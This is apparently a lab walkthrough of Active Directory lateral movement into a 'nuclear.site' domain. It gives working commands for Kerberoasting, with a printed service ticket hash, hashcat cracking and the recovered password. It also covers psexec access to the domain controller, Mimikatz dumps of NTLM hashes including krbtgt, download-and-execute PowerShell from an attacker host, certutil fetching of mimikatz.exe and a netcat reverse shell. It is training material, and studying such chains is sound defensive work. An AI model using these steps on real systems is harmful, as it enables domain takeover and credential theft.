# Lateral Movement 2

- [Lateral Movement 2](#lateral-movement-2)
  - [External Trust Enumeration](#external-trust-enumeration)
  - [Kerberoasting](#kerberoasting)
  - [Accessing Nuclear-DC](#accessing-nuclear-dc)
  - [Password Dumping](#password-dumping)
  - [External Domain Enumeration](#external-domain-enumeration)
  - [Enumerate Jump Server](#enumerate-jump-server)

---

## External Trust Enumeration

To enumerate, first import `PowerView_dev.ps1`:

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/PowerView_dev.ps1"))
```

<br/>

Then map Domain Trust:

```
Get-NetDomainTrust
```

![picture 29](images/8db1c3a16c4a0616f3e8265ea2fa46b39b5899f1d0bb9fb41899818f3fd71f4b.png)  

As shown, the current domain has a 2-way transitive external trust with the domain `nuclear.site`, which means we can abuse this to access `nuclear.site`.

<br/>

Also get the hostname of the external domain's DC:

```
nltest /dclist:nuclear.site
```
![picture 35](images/3a33c1dca608dbefe2696be84d209ef1e0203bb82186fe0eeddfff8fc7abd966.png)  

* The DC of `nuclear.site` is `nuclear-dc.nuclear.site`


<br/>

## Kerberoasting

To enumerate users with SPN set in the domain `nuclear.site`:

```
Get-NetUser -SPN -Domain nuclear.site
```

![picture 30](images/d2df022443d492d64e6195c2189609e0d190248628a5f5ad6210168e39261194.png)  

As shown, the user `iis_svc`, a domain admin, has a SPN `HTTP/nuclear-dc.nuclear.site`.

<br/>

First use `Invoke-Kerberoast.ps1` to get the krb5tgs hash:

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/Invoke-Kerberoast.ps1"))
Invoke-Kerberoast -Domain nuclear.site -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath C:\Users\Public\hashcat.txt -Width 8000
```

![picture 31](images/19cbb6d3dc3d9172258850644fc3a7721909fa878ed81655a207f62cf0d9b689.png)  

![picture 32](images/7c138eefa01c69de70200c48a5baec343c9388b9aea6059ccef5eebdbcc3bda4.png)  

```
$krb5tgs$23$*iis_svc$nuclear.site$HTTP/nuclear-dc.nuclear.site*$ABB0637E1A499656585BE02CE78CC050$A8D090286CE103508B6BDF1AD2DC391493CEC154FF944419006C247AC19365BA0EFBFA769D5B25393B7B28DE80FC4E59DF65771F199A826A932983F29FBF150662FE3A81F1875A02FB79977B519A878F469B7BFC819BD0565BD5444AF569E547A410755706FF820DF0285644B5912CA926EDE2104EDA716D735B7C2C3890C2E8D5458B3099DFF92588F9C3E478704F8BD0DAA74C55076BE36EFA0FAE64A23D241893A477544E788A0010BE3D6B97B1C05672B26B279FAD562FCF325774BD0DB697BCB1716BD03B07DCAA55319562FBED7CDB103651F5B887855561010D560736F54A3429D0FCC79D93C8B93C0BC00B56C619C62731AC3CE04468EC25E3EFE0EE947BC0CB6A1413078E52EB79013C40CF08D529E838D02959349CAF664579F5A72842590F9E48582C1C32EB19DB8D8E097C292757F2BA9CB9F737795AAA6643575DC197390092A06C0A91814DDECD9A0E21346396EC386C5C9715376E772DA974A809F1EC3A545D02EADB08385790723CC7E2FC8EBCFECEB68AD714DB0F34531387C766D1520693227FC935F834805B18AD92EAC54A4424F1739A340BF45803FF5B16C677AD9946AF96B14E8790D3333EE91ACE6A46AC448E012880C559B94DBF36896420C241289582A3DD8ABF8B598E49CA6B649E4A168A1C5AC271100DC2A0FEBF44842C89214613144F9AD8B237F989C4179066E8709430B1B9212A9EE2F9F950966BC4DE801F9EA53F14BAC902593CA75C7CAB18F78FF485746480BE900DFDEA05477987C099612823A6748D8B8A3F88374F717DBA399FD77DCBAABF803D61BAA15B4AB3C095ED7B008960338B26C9F6D6718113404F4855ACA46FA366E135E6AEF17C61D1F86D83AA67AD983FA2ED6868BF9CD80C9E23456252317087C57D32D982FE941AA6EE7F3C0F29CDB57C365D1C182348991DD44298009952E80DD435E2DE64624D0FA401C225BC40B48572674EB40281A42E7DA9FDA5EB5ACC65A7F0A69DD4CCE728D20A85EAB01A37612905695750B6798DC590EE50F9ED4E32D1CBA5A4F6E54AC74E427AC4A984861D3C184D61A8B88FA659E691D3B3B5C19C9E9EC54BBE6A0F4937B0B41ECC2B4962BD969FE14781B909B2B739552F2D34159283F96046222E72CF946E420BB85DFEDCEE67EA824517C893E5E31D85BC1968424869FBE0CE386EAF7730A0225D00198351DF1EAADA56E49F3E9FCD3CC717C8DD0E5BEED6E59E4AB47AFA47B17B94F540BD4EE0630534D431FE1641995C0F2D8C727A07F88BDAB899E790FECE929B23A60ADD1EAFAAD0BAB45A0EAB461247ECF3FEB6B9B1DC9B4B59FF1ABD2A55F554547D7688EA2847711F3185971A957BC93085168431D20E04DEF45C5187B9443D865FCE930AEB5FAA791CB5F7B8C653A02FACDF03E94BCDD8BC351309AE03C74D7777C4095F06B6DD0794397D2560DDB2DC68DB9A114B1163B640BF1C190358BD674893BC3FE47E1E5D99E603B8BDD48E0E77E069E9EDE51DB15E517B6F30770BAAFAF021250A5CCD46373B622A49409ED621C7DD16F30A0A620F78DD82EF9CCB942EC9
```

<br/>

Then try to crack it using hashcat (Windows):

```
hashcat.exe -m 13100 -a 0 .\ToBeCracked\cwf-advanced-iis.txt .\wordlists\rockyou.txt
```

![picture 33](images/f8317e73168bd08f0d2e282b8f9e0bd365b8b21d2a92eb07bd509a03e5ffe881.png)  

![picture 34](images/8ace7d53421ae8d3bcdd935cac1bf0bc4694774e3f2c088ba60c7dbfb9767384.png)  

The cracked password is:<br/>
`iis_svc` / `B@DB!tch`

<br/>

## Accessing Nuclear-DC

Getting the service account password (which is also a Domain Admin), we can use `psexec` to access from the attacker machine:

```
echo "nuclear-dc.nuclear.site 10.1.1.3" >> /etc/hosts
```

```
proxychains psexec.py -debug -dc-ip 10.1.1.3 iis_svc:'B@DB!tch'@nuclear-dc.nuclear.site 
```

![picture 36](images/ae0b6792916234a10a6491b01d8a5781bf50dab7e354086d2fc9d7c3687ad1f1.png)  

![picture 37](images/d921f2a8823f5dd21b7d85b4ce4b089c02dd642b1f0475228c2457d6e29244a7.png)  

As shown, we now have access to `nuclear-dc`.

<br/>

## Password Dumping

On the `nuclear-dc`, first download Mimikat:

```
certutil -urlcache -f http://192.168.100.11/mimikatz.exe .\mimikatz.exe
```

<br/>

Do a password dumping:

```
mimikatz "sekurlsa::logonpasswords"
```

Result:
```
C:\Users\Public>mimikatz.exe "token::elevate" "lsadump::lsa"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

736     {0;000003e7} 1 D 32511          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 26349641    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)    Primary
 * Thread Token  : {0;000003e7} 1 D 26384949    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)    Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : NUCLEAR-DC
SysKey : 923820e623ff23469eb511e2568af60d
Local SID : S-1-5-21-900803803-229387808-295469279

SAMKey : 901b3393f254bd84fea377c293be5bb9

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 56df9bfe3024dd4eb25b412ead89fe08

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

```

<br/>

Then dump from LSA:

```
.\mimikatz.exe "token::elevate" "lsadump::lsa /patch"
```

* Result:

```
Domain : NUCLEAR / S-1-5-21-2753455963-2528838614-3718188604                                              

RID  : 000001f4 (500)                                
User : Administrator                                 
LM   :                                               
NTLM : 4fc382c2e14308faef3de7494a08f27a              

RID  : 000001f5 (501)                                
User : Guest                                         
LM   :                                               
NTLM :                                               

RID  : 000001f6 (502)                                
User : krbtgt                                        
LM   :                                               
NTLM : c7dd5aac1c29b58e6121b1fcf2c14ce1              

RID  : 000001f7 (503)                                
User : DefaultAccount                                
LM   :                                               
NTLM :                                               

RID  : 0000044f (1103)                               
User : vdadmin                                       
LM   :                                               
NTLM : 1fbba53e43f63e4b29fb31376bd33fda              

RID  : 00000450 (1104)
User : homi
LM   : 
NTLM : 5887aeb7effe2954be747b895907800e

RID  : 00000451 (1105)
User : iyer
LM   : 
NTLM : 1ed88c67da13a44c5d81879baf879d74

RID  : 00000452 (1106)
User : sri
LM   : 
NTLM : 18e7d9e2d44d23e95760a2b3806914f1

RID  : 00000453 (1107)
User : nuclear-admin
LM   : 
NTLM : 3574ac2370c392ad2f8ad0610f3962ec

RID  : 00000454 (1108)
User : jump-admin
LM   : 
NTLM : 2dc9bff397f9e6c9f08a05b18145a7b6

RID  : 00000643 (1603)
User : iis_svc
LM   : 
NTLM : 2dc9bff397f9e6c9f08a05b18145a7b6

RID  : 000003e8 (1000)
User : NUCLEAR-DC$
LM   : 
NTLM : f17fea2b3043c10b2c3c7e9d699f4bc3

RID  : 00000455 (1109)
User : VDI-SERVER$
LM   : 
NTLM : 01da24ec1ae3573740ef5e6caf4d26ce

RID  : 00000457 (1111)
User : JUMP-SERVER$
LM   : 
NTLM : 207aae031b648fd24a27ef3f89ccc426

RID  : 00000641 (1601)
User : ATOMIC$
LM   : 
NTLM : 036422c643c2c192c4dd6d0212ace953

```


<br/>

On the local machine, launch a netcat listener:

```
nc -nlvp 443
```

<br/>

Obtain a reverse shell by executing the following command on `nuclear-dc`:

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/Invoke-PowerShellTcp.ps1"))
```

![picture 38](images/3fbbc8629a6d5b086efcc1a30c0b031a1b5569b443e5cfc680799a355660123d.png)  

<br/>

## External Domain Enumeration

First download and import `PowerView_dev.ps1`

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/PowerView_dev.ps1"))
```

<br/>

**Domain Computer:**
```
Get-NetComputer | Select CN, distinguishedname
```

* Result:
```
cn         
--         
cn          distinguishedname                                     
--          -----------------                                     
NUCLEAR-DC  CN=NUCLEAR-DC,OU=Domain Controllers,DC=nuclear,DC=site
VDI-SERVER  CN=VDI-SERVER,OU=VDI,DC=nuclear,DC=site               
JUMP-SERVER CN=JUMP-SERVER,OU=ICS,DC=nuclear,DC=site    
```

<br/>

```
Get-NetComputer | Select dnshostname | ForEach-Object { nslookup $_.dnshostname }
```

* Result:

```
Name:    Nuclear-DC.nuclear.site
Address:  10.1.1.3

Name:    VDI-SERVER.nuclear.site
Address:  10.1.1.8

Name:    Jump-Server.nuclear.site
Address:  10.1.1.4

```

<br/>

![picture 39](images/cca2de2c68c4e92f90a09e20172e997acc0e99817e4e013f23cd52daf9561d34.png)  

<br/>

**Domain Users:**

```
Get-NetUser | Select userprincipalname, distinguishedname
```

* Result:

```
userprincipalname          distinguishedname                                   
-----------------          -----------------                                   
                           CN=Administrator,CN=Users,DC=nuclear,DC=site        
                           CN=Guest,CN=Users,DC=nuclear,DC=site                
                           CN=DefaultAccount,CN=Users,DC=nuclear,DC=site       
                           CN=krbtgt,CN=Users,DC=nuclear,DC=site               
vdadmin@nuclear.site       CN=VD-Admin,OU=VDI,DC=nuclear,DC=site               
homi@nuclear.site          CN=Homi Jehangir Bhabha,OU=Scientist,DC=nuclear,D...
iyer@nuclear.site          CN=Iyer Murty,OU=Scientist,DC=nuclear,DC=site       
sri@nuclear.site           CN=Srinivasa Krishnan,OU=Scientist,DC=nuclear,DC=...
nuclear-admin@nuclear.site CN=Nuclear Admin,OU=Priv,DC=nuclear,DC=site         
jump-admin@nuclear.site    CN=Jump Admin,OU=ICS,DC=nuclear,DC=site             
iis_svc@nuclear.site       CN=IIS Service Account,CN=Users,DC=nuclear,DC=site
```

<br/>

## Enumerate Jump Server

Recall we have the following credential:

```
jump-admin / 2dc9bff397f9e6c9f08a05b18145a7b6
```

<br/>

Checking on crackstation.net, the cleartext password is revealed:

![picture 40](images/07ded5dcdbbd70fae4842272d12259586e27e708a907a00863a50c5ec2b3ff7c.png)  

Therefore we have the following credential:

* `jump-admin` / `B@DB!tch`

<br/>

Also we know that Jump-Server.nuclear.site (10.1.1.4) is a Ubuntu server. First try to perform a nmap scan:

```
proxychains nmap -n -Pn -sT -T4 10.1.1.4 --min-rate 5000
```

![picture 41](images/c7d040a01cebd240d67abc083ffbe9d20170b0fe430ce5c3f7f192236c23c7e8.png)  
* tcp/22 (SSH) is open

<br/>

Try to access via proxychains:

```
proxychains ssh jump-admin@10.1.1.4
```

![picture 42](images/053f255920ed6c32d598f8ff323f51dee6f0e89c6c5497ac89c8ec085a538791.png)  

As shown we can use the credential to access the jump-server.

<br/>

